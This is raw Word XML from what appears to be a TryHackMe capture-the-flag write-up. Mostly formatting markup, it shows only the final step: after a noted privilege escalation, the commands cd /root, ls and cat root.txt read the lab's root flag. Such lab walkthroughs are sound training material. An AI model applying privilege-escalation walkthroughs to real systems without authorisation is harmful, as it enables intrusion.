    <w:p w14:paraId="7BD63D56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This confirms privilege escalation success.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3595B63B" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRPr="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56FC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b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Step 20 – Capture Root Flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7CB951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Navigate to root directory:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ADE47FF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cd /root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7CC6E0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List files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E62C8F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ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4831BA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Read flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A8AD39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cat root.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0A38E7" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRP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CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Example output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F35BD8C" w14:textId="77777777" w:rsidR="00CC56FC" w:rsidRDefault="00CC56FC" w:rsidP="00CC56FC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>THM{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00CC56FC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>root_access</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CC56FC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68D3EC99" w14:textId="77777777" w:rsidR="00160515" w:rsidRPr="00CC56FC" w:rsidRDefault="00160515" w:rsidP="00CC56FC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00160515" w:rsidRPr="00CC56F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CB623D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1A245F3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5D72BDA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2980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1970F0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CAD015F6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094A8D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7D2EE70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9B525CA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="045EF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AED6050"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5E3ECBF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1A648D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="344248F6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4B9321C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4596F2BA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B7F209F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7374C1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E794909"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="365A6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0BE5183"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C04A5E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6525394"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3320C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7E530B1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="78A010C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8E51DCE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5FDC1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2CF16254"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00F2A88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FC716C3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="12023352"/>
    <w:lvl w:ilvl="0" w:tplc="6770BFFE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0D35570"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CD6C6568"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1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10424D0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0D2A7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2A656B9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7C1A6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34F84D2F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="97F4FC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5B524A0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B0FAF9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7C82B82"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B9102404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99128D6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9B023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9B17ACF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="57AAA59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AC43AE7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0240B4A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B6B2824"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4BC67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BB66A75"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="94863FB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3C7754A5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="054EC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C8C17FF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="920EA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EAF7E3F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="11E4AD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3EB13EFB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EE30284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410D5582"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DA5EE214"/>
    <w:lvl w:ilvl="0" w:tplc="FA1A713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5DF3C02"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AA980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65E393D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="20D299E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BB17FA4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F5F433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4F8C7605"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BC64D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20595E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4F04DC6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8CE1B72"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="21FE7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3A801D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5048347E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654D77AC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B302EB5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7EA3F5E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9638762A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00E0E68"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CB94641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0A11D3D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AE848844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1506CC8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0FD4BAB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1CE3E5A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7F1CDC86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749141E7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D99CAE88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4C85CFC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E9F88DF4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7E321C1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="55F03F7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74337355">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="129984539">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="108471940">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="193538323">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="366220090">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1735539949">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="565647425">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="658534718">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="551422476">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1001472308">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="126777715">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="67312626">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="515778528">
    <w:abstractNumId w:val="45"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="209734723">
    <w:abstractNumId w:val="56"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1615017675">
    <w:abstractNumId w:val="53"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="190917788">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="772945639">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1403796352">
    <w:abstractNumId w:val="49"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="595672996">
    <w:abstractNumId w:val="43"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="2099792975">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="929654234">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="302928193">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="970326452">
    <w:abstractNumId w:val="55"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="1077434543">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="1490361500">
    <w:abstractNumId w:val="52"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="2060857295">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="59834921">
    <w:abstractNumId w:val="44"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="976035196">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="1333987624">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="1077551834">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="1496413746">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="673994182">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="338428418">
    <w:abstractNumId w:val="47"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="1017972753">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="2085174865">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="305015888">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="1779373363">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="1675568417">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="1991709339">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="1020938701">
    <w:abstractNumId w:val="50"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="966274679">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="42" w16cid:durableId="1381972651">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="43" w16cid:durableId="27872634">
    <w:abstractNumId w:val="51"/>
  </w:num>
  <w:num w:numId="44" w16cid:durableId="182911140">
    <w:abstractNumId w:val="54"/>
  </w:num>
  <w:num w:numId="45" w16cid:durableId="1630434321">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="46" w16cid:durableId="954219211">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="47" w16cid:durableId="493255844">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="48" w16cid:durableId="1601716443">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="49" w16cid:durableId="829373934">
    <w:abstractNumId w:val="46"/>
  </w:num>
  <w:num w:numId="50" w16cid:durableId="191766010">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="51" w16cid:durableId="1506629694">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="52" w16cid:durableId="2003897189">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="53" w16cid:durableId="1868441390">
    <w:abstractNumId w:val="48"/>
  </w:num>
  <w:num w:numId="54" w16cid:durableId="1924025276">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="55" w16cid:durableId="678971404">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="56" w16cid:durableId="648823067">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="57" w16cid:durableId="179779568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515"/>
    <w:rsid w:val="001E7027"/>
    <w:rsid w:val="002750E4"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00323B07"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00422750"/>
    <w:rsid w:val="00471647"/>
    <w:rsid w:val="00590969"/>
    <w:rsid w:val="00610703"/>
    <w:rsid w:val="006B575F"/>
    <w:rsid w:val="007E4832"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AA516E"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CC56FC"/>
    <w:rsid w:val="00F716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BA6F911"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{C4C25391-6F41-407D-93D9-29F8F1C7BC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AA516E"/>
    <w:rPr>
      <w:rFonts w:ascii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0703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07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695</Words>
  <Characters>3962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4648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priya vijay</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-10T13:02:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-10T13:27:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>